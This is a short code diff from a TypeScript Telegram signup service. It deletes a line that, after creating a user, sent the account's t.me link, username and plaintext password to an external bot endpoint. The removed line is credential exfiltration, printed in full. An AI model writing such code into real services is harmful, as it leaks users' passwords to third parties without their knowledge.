@@ -367,7 +367,6 @@ export class TgSignupService implements OnModuleDestroy {
             }
 
             await this.usersService.create(userData);
-            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: htts://t.me/${userData.mobile}\nUsername: @${userData.username}\n${userData.password ? `Password: ${userData.password}\n` : ''}`)}`);
 
             return {
                 status: 200,
